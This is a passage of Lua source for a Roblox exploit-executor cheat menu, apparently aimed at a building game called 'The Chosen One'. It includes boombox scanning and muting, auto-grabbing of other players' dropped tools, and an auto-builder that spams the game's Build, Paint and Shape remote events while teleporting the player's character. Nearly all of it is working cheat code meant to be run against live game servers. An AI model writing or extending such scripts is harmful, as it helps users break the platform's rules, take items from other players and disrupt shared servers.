                    Library:Notify("Boombox Selected: " .. potentialBoombox.Name, 3)
                else
                    boomboxId = "None"
                    BoomboxStatus:SetText("Boombox: " .. potentialBoombox.Name .. "\nNo sound playing")
                    bbsbox.Adornee = nil
                end
           
            elseif target.Name == "Handle" and boomboxNames[target.Parent.Name] == true then
                selectedBoombox = target.Parent
                
                local sound = target.Parent:FindFirstChild("Sound", true)
                if sound and sound.SoundId ~= "" and sound.SoundId ~= nil then
                    boomboxId = extractSoundId(sound)
                    BoomboxStatus:SetText("Boombox: " .. target.Parent.Name .. "\nSound ID: " .. boomboxId .. "\nClick 'Copy ID' to copy")
                    
                    bbsbox.Adornee = target
                    bbsbox.LineThickness = 0.05
                    Library:Notify("Boombox Selected: " .. target.Parent.Name, 3)
                else
                    boomboxId = "None"
                    BoomboxStatus:SetText("Boombox: " .. target.Parent.Name .. "\nNo sound playing")
                    bbsbox.Adornee = nil
                end
            else
                selectedBoombox = nil
                boomboxId = ""
                BoomboxStatus:SetText("Select a Boombox")
                bbsbox.Adornee = nil
            end
        end
    end
end

trackScriptConnection(UserInputService.InputBegan:Connect(onInputBegan)) -- pealz, i soskoify added trackscriptconnection bc u stupid and that why broke

TCOToolsGroup:CreateButton({
    Name = 'Copy Sound ID',
    Function = function()
        if boomboxId ~= "" and boomboxId ~= "None" then
            if setclipboard then
                setclipboard(boomboxId)
                Library:Notify("Copied Sound ID: " .. boomboxId, 3)
            else
                Library:Notify("Clipboard function not available", 3)
            end
        else
            Library:Notify("No sound ID to copy", 3)
        end
    end
})

TCOToolsGroup:CreateButton({
    Name = 'Scan Boomboxes',
    Function = function()
        local boomboxList = {}
        

        for _, obj in pairs(CoreGui:GetChildren()) do
            if obj.Name == "BoomboxHighlight" then
                obj:Destroy()
            end
        end

        -- Check workspace direct children + player inventories for boomboxes
        for _, item in ipairs(workspace:GetChildren()) do
            if item:IsA("Tool") and boomboxNames[item.Name] == true then
                boomboxList[#boomboxList+1] = item
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Character then
                for _, item in ipairs(p.Character:GetChildren()) do
                    if item:IsA("Tool") and boomboxNames[item.Name] == true then
                        boomboxList[#boomboxList+1] = item
                    end
                end
            end
            if p:FindFirstChild("Backpack") then
                for _, item in ipairs(p.Backpack:GetChildren()) do
                    if item:IsA("Tool") and boomboxNames[item.Name] == true then
                        boomboxList[#boomboxList+1] = item
                    end
                end
            end
        end
        for _, item in ipairs(boomboxList) do
            local highlight = Instance.new("Highlight")
            highlight.Name = "BoomboxHighlight"
            highlight.FillColor = Color3.fromRGB(255, 100, 100)
            highlight.FillTransparency = 0.7
            highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineTransparency = 0
            highlight.Adornee = item
            highlight.Parent = CoreGui
        end
        
        if #boomboxList > 0 then
            local info = "Found " .. #boomboxList .. " boombox(es):\n\n"
            
            for i, boombox in ipairs(boomboxList) do
                local sound = boombox:FindFirstChild("Sound", true)
                local soundId = "None"
                if sound and sound.SoundId ~= "" and sound.SoundId ~= nil then
                    soundId = extractSoundId(sound)
                end
                
                info = info .. i .. ". " .. boombox.Name .. "\n"
                info = info .. "   ID: " .. soundId .. "\n\n"
            end
            
            BoomboxStatus:SetText("Server Boomboxes (" .. #boomboxList .. ")\n" .. info)
            Library:Notify("Found " .. #boomboxList .. " boombox(es)", 3)
        else
            BoomboxStatus:SetText("No boomboxes found on server")
            Library:Notify("No boomboxes found", 3)
        end
    end
})

TCOToolsGroup:CreateButton({
    Name = 'Clear Highlights',
    Function = function()
        for _, obj in pairs(CoreGui:GetChildren()) do
            if obj.Name == "BoomboxHighlight" then
                obj:Destroy()
            end
        end
        Library:Notify("All highlights cleared", 3)
    end
})

end -- /══ Boombox Utility ══

do -- ══ Tool Utility ══
local ToolsEtc = Tabs.Chat:CreateModule({Name = 'Tool Utility'})

muteBoomboxesEnabled = false

MuteBoomboxesToggle = ToolsEtc:CreateToggle({
    Name = 'Mute All Boomboxes',
    Default = false,
    Tooltip = 'Mute all boombox sounds on the server'
})

AutoPickup = ToolsEtc:CreateToggle({
    Name = 'Auto Pickup Tools',
    Default = false,
    Tooltip = 'Automatically pick up dropped tools'
})

AutoDrop = ToolsEtc:CreateToggle({
    Name = 'Auto Drop on Death',
    Default = false,
    Tooltip = 'Automatically drop tools when dying'
})

local DontDropEnlighten = ToolsEtc:CreateToggle({
    Name = "Prevent Enlighten Drop",
    Default = true,
    Tooltip = 'Keep The Arkenstone when auto-dropping tools'
})

DontDropEnlighten:OnChanged(function()
    dontDropEnlighten = DontDropEnlighten.Value
end)

local AutoR6Toggle = ToolsEtc:CreateToggle({
    Name = 'Auto R6 on Death',
    Default = false,
    Tooltip = 'When you die, instantly equips Enlighten and sends /r6 to revive'
})
AutoR6Toggle:OnChanged(function()
    autoR6Enabled = AutoR6Toggle.Value
    if autoR6Enabled and plr.Character then
        task.spawn(function() setupAutoR6Character(plr.Character) end)
    end
    Library:Notify(autoR6Enabled and "Auto R6 ON" or "Auto R6 OFF", 2)
end)


ToolsEtc:CreateButton({
    Name = 'Grab All Tools',
    Function = GrabTools
})

ToolsEtc:CreateButton({
    Name = 'Equip All Tools',
    Function = function()
        for _, tool in pairs(plr.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = plr.Character
            end
        end
        Library:Notify("All tools equipped", 3)
    end
})

ToolsEtc:CreateButton({
    Name = 'Drop All Tools',
    Function = function()
        for _, tool in pairs(plr.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = plr.Character
            end
        end
        task.wait()
        for _, tool in pairs(plr.Character:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = workspace
            end
        end
        Library:Notify("All tools dropped", 3)
    end
})

http = game:GetService("HttpService")
localplr = game.Players.LocalPlayer
local lte = nil

function checktool(t)
    if lte ~= t.Name then
        if localplr.Character and t.Parent then
            t.Parent = localplr.Character
            task.wait()
            t.Parent = localplr.Backpack
            lte = t.Name
        end
    end
end

getbuild = function()
    if SavedBuildDropdown and SavedBuildDropdown.Value ~= "" then
        return http:JSONDecode(readfile("TheChosenOneBuilds/"..SavedBuildDropdown.Value..".json"))
    end
    return nil
end

listfilesfixed = function(directory)
    s,lf = pcall(function()
        return listfiles(directory)
    end)
    if s then
        for i,v in pairs(lf) do
            if string.sub(v,1,2) == "./" then
                lf[i] = string.sub(v,3)
            end
        end
    end
    return lf
end
plrbuilds = {ServerBuilds = cfolder}
plrnames = {"ServerBuilds"}
buildhighlight = Instance.new("Highlight")
buildhighlight.Parent = game.CoreGui
buildhighlight.FillColor = Color3.fromRGB(0,255,0)
buildhighlight.FillTransparency = .9

highlight = Instance.new("Highlight")
highlight.Parent = game.CoreGui
highlight.FillColor = Color3.fromRGB(0, 200, 255)
highlight.FillTransparency = 0.5
highlight.OutlineColor = Color3.fromRGB(0, 200, 255)
highlight.OutlineTransparency = 0

getfn = function(js,first)
    fn = listfilesfixed("TheChosenOneBuilds/") or listfilesfixed("TheChosenOneBuilds")
    if not fn or #fn == 0 then
        return {}
    end
    if not js then
        for i,v in pairs(fn) do
            fn[i] = v:gsub(".json","")
        end
    end
    if not first then
        for i,v in pairs(fn) do
            fn[i] = v:gsub("TheChosenOneBuilds/","")
        end
    end
    return fn
end

snap = function(pos,m)
    if m == nil then
        m = gridSize
    end
    x = math.round(pos.X/m)+2
    return pos
end

if cfolder:FindFirstChild(game.Players.LocalPlayer.Name) then
    cubechild = cfolder[game.Players.LocalPlayer.Name].ChildAdded:Connect(function(child)
        childcube = child
        historynum = historynum + 1
        if historynum > historymax then
            historynum = 1
        end
        if buildingtoxify then
            toxifybrick = child
        end
        cubehistory[historynum] = child
        built = true
    end)
else
    cubechild = cfolder.ChildAdded:Connect(function()
    end)
end

defaultcolor = Color3.fromRGB(192,192,192)
buildingexec = nil
normalids = {}
normalids[Enum.NormalId.Right] = {Vector3.new(1,0,0),"X"}
normalids[Enum.NormalId.Top] = {Vector3.new(0,1,0),"Y"}
normalids[Enum.NormalId.Back] = {Vector3.new(0,0,1),"Z"}
normalids[Enum.NormalId.Left] = {Vector3.new(-1,0,0),"X"}
normalids[Enum.NormalId.Bottom] = {Vector3.new(0,-1,0),"Y"}
normalids[Enum.NormalId.Front] = {Vector3.new(0,0,-1),"Z"}

roundnum = function(num,m)
    return math.round((num - 2) / m) * m + 2
end

roundBuildPos = function(pos,m)
    return Vector3.new(roundnum(pos.X,m or gridSize),roundnum(pos.Y,m or gridSize),roundnum(pos.Z,m or gridSize))
end

materials = {}
materials[Enum.Material.SmoothPlastic] = "smooth"
materials[Enum.Material.Plastic] = "plastic"
materials[Enum.Material.CeramicTiles] = "tiles"
materials[Enum.Material.Brick] = "bricks"
materials[Enum.Material.WoodPlanks] = "planks"
materials[Enum.Material.Ice] = "ice"
materials[Enum.Material.Grass] = "grass"
materials[Enum.Material.Sand] = "sand"
materials[Enum.Material.Snow] = "snow"
materials[Enum.Material.Glass] = "glass"
materials[Enum.Material.Wood] = "wood"
materials[Enum.Material.Slate] = "stone"
materials[Enum.Material.Pebble] = "pebble"
materials[Enum.Material.Marble] = "marble"
materials[Enum.Material.Granite] = "granite"
materials[Enum.Material.DiamondPlate] = "steel"
materials[Enum.Material.Metal] = "metal"
materials[Enum.Material.Asphalt] = "asphalt"
materials[Enum.Material.Concrete] = "concrete"
materials[Enum.Material.Pavement] = "pavement"
materials[Enum.Material.Neon] = "neon"

swappedmaterials = {}
for i,v in pairs(materials) do
    swappedmaterials[v] = i
end

starterui = game:GetService("StarterGui")
savebuildnames = {}
builds = {}

updatedropdown = function()
    names = getfn()
    table.sort(names,function(a,b)
        return a:lower() < b:lower()
    end)
    if SavedBuildDropdown then
        SavedBuildDropdown:Refresh(names)
    end
    writefile("thechosenonenames.txt",http:JSONEncode(savebuildnames))
end

bindfunc = Instance.new("BindableFunction")
bindfunc.OnInvoke = function(prompt)
    if prompt == "Yes" and SavedBuildDropdown.Value ~= "" then
        delfile("TheChosenOneBuilds/"..SavedBuildDropdown.Value..".json")
        SavedBuildDropdown.Value = ""
        updatedropdown()
    end
end

bannedsymbols = {}
bannedsymbols["\""] = "''"
bannedsymbols["*"] = "★"
bannedsymbols[":"] = ";"
bannedsymbols["<"] = "≤"
bannedsymbols[">"] = "≥"
bannedsymbols["?"] = "¿"
bannedsymbols["\\"] = ""
bannedsymbols["|"] = "I"
bannedsymbols["/"] = "∕"

validate = function(name)
    for i,v in pairs(bannedsymbols) do
        name = name:gsub(i,v)
    end
    s = string.find(name,"%.txt") or string.find(name,"%.json")
    if s then
        addafter = string.sub(name,s)
        name = string.sub(name,1,s-1)
        name = name:gsub("%.","·")
        name = name..addafter
    else
        name = name:gsub("%.","·")
    end
    return name
end

files = listfilesfixed("")
if not files then
    files = {}
end

s,e = pcall(function()
    if not table.find(files,"TheChosenOneBuilds/") and not table.find(files,"TheChosenOneBuilds") then
        task.wait(1)
        builds = {}
        if isfile("thechosenonebuilds.txt") then
            builds = http:JSONDecode(readfile("thechosenonebuilds.txt"))
        end
        makefolder("TheChosenOneBuilds")
        i2 = 0
        for i,v in pairs(builds) do
            i = validate(i)
            s,e = pcall(function()
                writefile("TheChosenOneBuilds/"..i..".json",http:JSONEncode(v))
            end)
            if not s then
                i2 = i2 + 1
                writefile("TheChosenOneBuilds/CheckFile_Named_'TCO"..tostring(i2).."'.json",http:JSONEncode(v))
                writefile("'TCO"..tostring(i2).."'.txt","If you came here from the CheckFile file, your build name had an error ("..i..") DO NOT change the file name to that name, it's best just to rename the file to something else.")
            end
            task.wait()
        end
    end
end)

s,e = pcall(function()
    if isfile("thechosenonenames.txt") then
        savebuildnames = http:JSONDecode(readfile("thechosenonenames.txt"))
    end
end)

if savebuildnames == nil then
    savebuildnames = {}
end

createpartpos = function(pos,col)
    if typeof(pos) == "CFrame" then
        pos = pos.Position
    end
    p = Instance.new("Part")
    p.Shape = Enum.PartType.Ball
    p.Anchored = true
    p.CanCollide = false
    p.CastShadow = false
    p.CanQuery = false
    p.Color = col
    p.Transparency = .5
    p.Size = Vector3.new(3,3,3)
    p.CFrame = CFrame.new(pos)
    p.Parent = workspace
end

createpartrepl = function(pos,bsize,col,mat,transp,anch,collide,sprays)
    if typeof(pos) == "CFrame" then
        pos = pos.Position
    end
    p = Instance.new("Part")
    oldprt = p
    p.Anchored = anch or true
    p.CanCollide = collide or false
    p.CastShadow = false
    p.CanQuery = false
    p.Color = col
    p.Transparency = transp or .5
    p.Material = mat
    if bsize ~= nil then
        pos = Vector3.new((pos.X + (bsize.X/2))-.5,(pos.Y + (bsize.Y/2))-.5,(pos.Z + (bsize.Z/2))-.5)
    end
    p.Size = bsize or Vector3.new(gridSize,gridSize,gridSize)
    p.CFrame = CFrame.new(pos)
    if sprays then
        for i,v in pairs(sprays) do
            face = Enum.NormalId[v[1]]
            image = v[2]
            txt = v[3]
            surfaceui = Instance.new("SurfaceGui")
            surfaceui.Face = face
            surfaceui.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
            surfaceui.PixelsPerStud = 50
            out,count = string.gsub(txt,"#","l")
            if count == string.len(txt) then
                img = Instance.new("ImageLabel")
                img.Image = image
                img.BackgroundTransparency = 1
                img.Size = UDim2.new(1,0,1,0)
                img.Parent = surfaceui
            else
                textlabel = Instance.new("TextLabel")
                textlabel.Text = txt
                textlabel.BackgroundTransparency = 1
                textlabel.TextScaled = true
                textlabel.TextColor3 = Color3.fromRGB(255,255,255)
                textlabel.Font = Enum.Font.FredokaOne
                textlabel.Size = UDim2.new(1,0,1,0)
                textlabel.Parent = surfaceui
            end
            surfaceui.Parent = p
        end
    end
    p.Parent = workspace
    return p
end



saveblock = function(bl)
    blockdata = {}
    if bl:IsA("BasePart") then
        p = bl.Position
        blockdata.p = {bl.Position.X,bl.Position.Y,bl.Position.Z}
        blockdata.c = {math.round(bl.Color.R*255),math.round(bl.Color.G*255),math.round(bl.Color.B*255)}
        blockdata.a = bl.Anchored
        blockdata.cc = bl.CanCollide
        if bl.Size.X ~= gridSize or bl.Size.Y ~= gridSize or bl.Size.Z ~= gridSize then
            blockdata.p[1] = (blockdata.p[1] - (bl.Size.X/2))+.5
            blockdata.p[2] = (blockdata.p[2] - (bl.Size.Y/2))+.5
            blockdata.p[3] = (blockdata.p[3] - (bl.Size.Z/2))+.5
            blockdata.s = {bl.Size.X,bl.Size.Y,bl.Size.Z}
        end
        blockdata.m = materials[bl.Material]
        blockdata.o = bl.Material.Name
        local sprayData = {}
        for _, child in ipairs(bl:GetChildren()) do
            if child:IsA("SurfaceGui") then
                local faceName = child.Face.Name
                local imageId = ""
                local txt = ""
                local imgLabel = child:FindFirstChildWhichIsA("ImageLabel", true)
                local txtLabel = child:FindFirstChildWhichIsA("TextLabel", true)
                if imgLabel then
                    imageId = imgLabel.Image or ""
                end
                if txtLabel then
                    txt = txtLabel.Text or ""
                end
                if txt ~= "" or imageId ~= "" then
                    table.insert(sprayData, {faceName, imageId, txt})
                end
            end
        end
        if #sprayData > 0 then
            blockdata.sp = sprayData
        end
    end
    return blockdata
end

getSpawnPosition = function()
    spawnLocations = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn")
    if spawnLocations then
        if spawnLocations:IsA("Model") then
            humanoidRootPart = spawnLocations:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                return humanoidRootPart.Position
            end
        elseif spawnLocations:IsA("BasePart") then
            return spawnLocations.Position
        end
    end
    
    players = game.Players:GetPlayers()
    for _, player in ipairs(players) do
        if player.Character then
            humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                return humanoidRootPart.Position
            end
        end
    end
    
    return Vector3.new(0, 100, 0)
end

sortBlocksByDistanceFromSpawn = function(buildData)
    local spawnPos = getSpawnPosition()

    for i, block in ipairs(buildData) do
        local blockPos = Vector3.new(block.p[1], block.p[2], block.p[3])
        if block.s then
            blockPos = Vector3.new(
                blockPos.X + (block.s[1]/2) - 0.5,
                blockPos.Y + (block.s[2]/2) - 0.5,
                blockPos.Z + (block.s[3]/2) - 0.5
            )
        end
        block.distance = (blockPos - spawnPos).Magnitude
        block.originalIndex = i
    end

    table.sort(buildData, function(a, b)
        return a.distance < b.distance
    end)

    for _, block in ipairs(buildData) do
        block.distance = nil
        block.originalIndex = nil
    end

    return buildData
end
buildblock = function(pos,texture,color,bsize,bsizev3,premadebuild,origmaterial,sprays,anchored,collide)
    task.wait()
    if anchored == nil then
        anchored = true
    end
    if collide == nil then
        collide = true
    end
    local needsresize = false
    local s,e = pcall(function()
    local s,e = pcall(function()
        game.Players.LocalPlayer.Backpack.Build.Parent = game.Players.LocalPlayer.Character
    end)
local oo = false
local c = 0
childcube = nil
if #cubehistory > 0 and oldprt then
    local allooslol = {}
    for i,childcube2 in pairs(cubehistory) do
        if childcube2 == nil or childcube2.Parent == nil then
            cubehistory[i] = nil
            continue
        elseif oldprt.Size == childcube2.Size then
            for idx,v in pairs(normalids) do
                local pos = childcube2.Position+(v[1]*childcube2.Size[v[2]])
                if pos == oldprt.Position then
                    oo = {idx,childcube2,childcube2.Position+(v[1]*childcube2.Size[v[2]]/2)}
                    table.insert(allooslol,{idx,childcube2,childcube2.Position+(v[1]*childcube2.Size[v[2]]/2)})
                end
            end
        end
    end
    if #allooslol > 1 and color and oo and oo[2] and oo[2].Color ~= color then
        for i,v in pairs(allooslol) do
            if v[2].Color == color then
                oo = v
            end
        end
    end
    local origposs = pos
        if oo and oo[2] ~= nil and oo[2].Parent ~= nil then
            local args = {
                [1] = oo[2],
                [2] = oo[1],
                [3] = oo[3] or oldprt.Position,
                [4] = "normal"
            }
            built = false
            childcube = nil
            c = 0
            repeat
                c = c + 1
                if game.Players.LocalPlayer.Character:FindFirstChild("Build") then
                    event = (game.Players.LocalPlayer.Character.Build:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Build.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Build.Script.Event:FireServer(unpack(args))
                else
                    s,e = pcall(function()
                        game.Players.LocalPlayer.Backpack.Build.Parent = game.Players.LocalPlayer.Character
                    end)
                end
                s,e = pcall(function()
                    pos = oo[3] or pos
                    if tp then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                    end
                end)
                task.wait()
            until (built == true and childcube) or oo[2] == nil or oo[2].Parent == nil or stopped == true or skipblock == true or c > 40
            if oo[2] == nil or oo[2].Parent == nil or c > 40 then
                oo = false
            else
                if oldprt then
                    oldprt:Destroy()
                end
            end
        end
        pos = origposs
    end
    if oo == false then
    if bsize == nil then
        bsize = "normal"
        if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Build") and game.Players.LocalPlayer.PlayerGui.Build:FindFirstChild("Button") then
            bsize = game.Players.LocalPlayer.PlayerGui.Build.Button.Text
        end
        if bsizev3 ~= nil and (bsizev3.X ~= gridSize or bsizev3.Y ~= gridSize or bsizev3.Z ~= gridSize) then
            bsize = "detailed"
        elseif bsizev3 ~= nil and (bsizev3.X == gridSize and bsizev3.Y == gridSize and bsizev3.Z == gridSize) then
            bsize = "normal"
        end
        if bsizev3 == nil and (bsize ~= "detailed") and oldprt and oldprt.Position ~= round(pos) then
            bsize = "detailed"
            needsresize = true
            bsizev3 = Vector3.new(4,4,4)
            pos = Vector3.new((pos.X - (bsizev3.X/2))+.5,(pos.Y - (bsizev3.Y/2))+.5,(pos.Z - (bsizev3.Z/2))+.5)
        end
    end
    local oldpos = pos
    pos = snap(pos)
    local args = {
        [1] = workspace.Terrain,
        [2] = Enum.NormalId.Top,
        [3] = pos,
        [4] = bsize or "normal"
    }
    built = false
    s,e = pcall(function()
        event = (game.Players.LocalPlayer.Character.Build:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Build.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Build.Script.Event:FireServer(unpack(args))
    end)
    c = 0
    repeat
        c = c + 1
        if game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("Build") and game.Players.LocalPlayer.Backpack:FindFirstChild("Build") then
            game.Players.LocalPlayer.Backpack.Build.Parent = game.Players.LocalPlayer.Character
        end
        if game.Players.LocalPlayer.Character:FindFirstChild("Build") then
            event = (game.Players.LocalPlayer.Character.Build:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Build.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Build.Script.Event:FireServer(unpack(args))
        end
        s,e = pcall(function()
            if tp then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,6,0))
            end
        end)
        task.wait()
    until (built == true and childcube) or stopped == true or skipblock == true or c > 150
    built = false
    c = 0
    end
    if childcube and typeof(color) == "Color3" and (color ~= defaultcolor or (childcube.Color ~= color or childcube.Material ~= texture)) and (game.Players.LocalPlayer.Backpack:FindFirstChild("Paint") or game.Players.LocalPlayer.Character:FindFirstChild("Paint")) and ((colorbool and premadebuild ~= nil) or not colorbool) or texture then
        local pos = (childcube and childcube.Position + childcube.Size/2) or pos
        local args = {
            [1] = childcube,
            [2] = Enum.NormalId.Top,
            [3] = pos,
            [4] = "color",
            [5] = color or nil,
            [6] = "tiles",
            [7] = ""
        }
        task.wait()
        local success,err = pcall(function()
            game.Players.LocalPlayer.Backpack.Paint.Parent = game.Players.LocalPlayer.Character
        end)
        if texture ~= nil then
            if color == nil then
                args[4] = "material"
            else
                args[4] = "both \u{1F91D}"
            end
            args[6] = texture
        end
        if not childcube then
            oldprt:Destroy()
            return
        end
        local oldcolor = childcube.Color
        highlight.Adornee = childcube
        c = 0
        s,e = pcall(function()    
        repeat
            c = c + 1
            if game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("Paint") and game.Players.LocalPlayer.Backpack:FindFirstChild("Paint") then
                game.Players.LocalPlayer.Backpack.Paint.Parent = game.Players.LocalPlayer.Character
            end
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Paint") then
                event = (game.Players.LocalPlayer.Character.Paint:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Paint.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Paint.Script.Event:FireServer(unpack(args))
            end
            s,e = pcall(function()

                if tp then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,6,0))
                end
            end)
            task.wait()
        until not childcube or not childcube.Parent or childcube.Color == color or (texture and childcube.Material == Enum.Material[origmaterial]) or stopped == true or skipblock == true or c > 2000
        end)
    end
    if childcube and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Paint") and childcube.Anchored ~= anchored then
        local pos = (childcube and childcube.Position + childcube.Size/2) or pos
        local args = {
            [1] = childcube,
            [2] = Enum.NormalId.Top,
            [3] = pos or childcube.Position+Vector3.new(1,0,0),
            [4] = "material",
            [5] = nil,
            [6] = "anchor",
            [7] = ""
        }
        c = 0
        repeat
            c = c + 1
            if game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("Paint") and game.Players.LocalPlayer.Backpack:FindFirstChild("Paint") then
                game.Players.LocalPlayer.Backpack.Paint.Parent = game.Players.LocalPlayer.Character
            end
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Paint") and childcube and childcube.Anchored ~= anchored then
                event = (game.Players.LocalPlayer.Character.Paint:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Paint.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Paint.Script.Event:FireServer(unpack(args))
            end
            s,e = pcall(function()
                if tp then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,8,0))
                end
            end)
            task.wait(1)
        until not childcube or not childcube.Parent or childcube.Anchored == anchored or not game.Players.LocalPlayer.Character or (not game.Players.LocalPlayer.Character:FindFirstChild("Paint") and not game.Players.LocalPlayer.Backpack:FindFirstChild("Paint")) or stopped == true or skipblock == true or c > 20
    end
    if childcube and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Paint") and childcube.CanCollide ~= collide then
        local pos = (childcube and childcube.Position + childcube.Size/2) or pos
        local args = {
            [1] = childcube,
            [2] = Enum.NormalId.Top,
            [3] = pos or childcube.Position+Vector3.new(1,0,0),
            [4] = "material",
            [5] = nil,
            [6] = "collide",
            [7] = ""
        }
        c = 0
        repeat
            c = c + 1
            if game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("Paint") and game.Players.LocalPlayer.Backpack:FindFirstChild("Paint") then
                game.Players.LocalPlayer.Backpack.Paint.Parent = game.Players.LocalPlayer.Character
            end
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Paint") and childcube and childcube.CanCollide ~= collide then
                event = (game.Players.LocalPlayer.Character.Paint:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Paint.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Paint.Script.Event:FireServer(unpack(args))
            end
            s,e = pcall(function()
                if tp then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,8,0))
                end
            end)
            task.wait(1)
        until not childcube or not childcube.Parent or childcube.CanCollide == collide or not game.Players.LocalPlayer.Character or (not game.Players.LocalPlayer.Character:FindFirstChild("Paint") and not game.Players.LocalPlayer.Backpack:FindFirstChild("Paint")) or stopped == true or skipblock == true or c > 20
    end
    highlight.Adornee = nil
    if childcube and (game.Players.LocalPlayer.Backpack:FindFirstChild("Paint") or game.Players.LocalPlayer.Character:FindFirstChild("Paint")) and sprays ~= nil then
        local args = {
            [1] = childcube,
            [2] = Enum.NormalId.Front,
            [3] = childcube.Position+Vector3.new(1,0,0),
            [4] = "material",
            [5] = nil,
            [6] = "spray",
            [7] = "ha"
        }
        for i,v in pairs(sprays) do
            args[2] = Enum.NormalId[v[1]]
            local sprayPayload = v[3]
            if (sprayPayload == nil or sprayPayload == "") and type(v[2]) == "string" and v[2] ~= "" then
                sprayPayload = v[2]
            end
            args[7] = sprayPayload or ""
            if childcube and (game.Players.LocalPlayer.Backpack:FindFirstChild("Paint") or game.Players.LocalPlayer.Character:FindFirstChild("Paint")) and stopped == false and skipblock == false then
                local success,err = pcall(function()
                    game.Players.LocalPlayer.Backpack.Paint.Parent = game.Players.LocalPlayer.Character
                end)
                local success,err = pcall(function()
                    task.wait(.25)
                    event = (game.Players.LocalPlayer.Character.Paint:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Paint.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Paint.Script.Event:FireServer(unpack(args))
                end)
            end
        end
    end
    if childcube and ((bsizev3 ~= nil and (bsizev3.X ~= gridSize or bsizev3.Y ~= gridSize or bsizev3.Z ~= gridSize)) or needsresize == true) and (game.Players.LocalPlayer.Character:FindFirstChild("Shape") or game.Players.LocalPlayer.Backpack:FindFirstChild("Shape")) then
        if not game.Players.LocalPlayer.Character:FindFirstChild("Shape") and game.Players.LocalPlayer.Backpack:FindFirstChild("Shape") then
            game.Players.LocalPlayer.Backpack.Shape.Parent = game.Players.LocalPlayer.Character
        end
        local args = {
            [1] = childcube,
            [2] = Enum.NormalId.Right,
            [3] = "",
            [4] = ""
        }
        if childcube and childcube.Size.X ~= bsizev3.X then
            c = 0
            repeat
                c = c + 1
                pos = (childcube and childcube.Position + childcube.Size/2) or pos
                args[4] = nil
                if childcube then
                    args[3] = pos
                    if childcube.Size.X > bsizev3.X then
                        args[4] = "decrease"
                    elseif childcube.Size.X < bsizev3.X then
                        args[4] = "increase"
                    end
                end
                if not game.Players.LocalPlayer.Character:FindFirstChild("Shape") and game.Players.LocalPlayer.Backpack:FindFirstChild("Shape") then
                    game.Players.LocalPlayer.Backpack.Shape.Parent = game.Players.LocalPlayer.Character
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Shape") then
                    event = (game.Players.LocalPlayer.Character.Shape:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Shape.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Shape.Script.Event:FireServer(unpack(args))
                end
                s,e = pcall(function()
                    if tp then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,6,0))
                    end
                end)
                task.wait(resizewait)
            until args[4] == nil or (args[4] == "decrease" and childcube and childcube.Size.X <= 1) or (childcube and childcube.Size.X == bsizev3.X) or stopped == true or skipblock == true or not childcube or not childcube.Parent or c > (bsizev3.X*3)/resizewait
        end
        args[2] = Enum.NormalId.Top
        c = 0
        if childcube and childcube.Size.Y ~= bsizev3.Y then
            repeat
                c = c + 1
                pos = (childcube and childcube.Position + childcube.Size/2) or pos
                args[4] = nil
                if childcube then
                    args[3] = pos
                    if childcube.Size.Y > bsizev3.Y then
                        args[4] = "decrease"
                    elseif childcube.Size.Y < bsizev3.Y then
                        args[4] = "increase"
                    end
                end
                if not game.Players.LocalPlayer.Character:FindFirstChild("Shape") and game.Players.LocalPlayer.Backpack:FindFirstChild("Shape") then
                    game.Players.LocalPlayer.Backpack.Shape.Parent = game.Players.LocalPlayer.Character
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Shape") then
                    event = (game.Players.LocalPlayer.Character.Shape:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Shape.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Shape.Script.Event:FireServer(unpack(args))
                end
                s,e = pcall(function()
                    if tp then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,6,0))
                    end
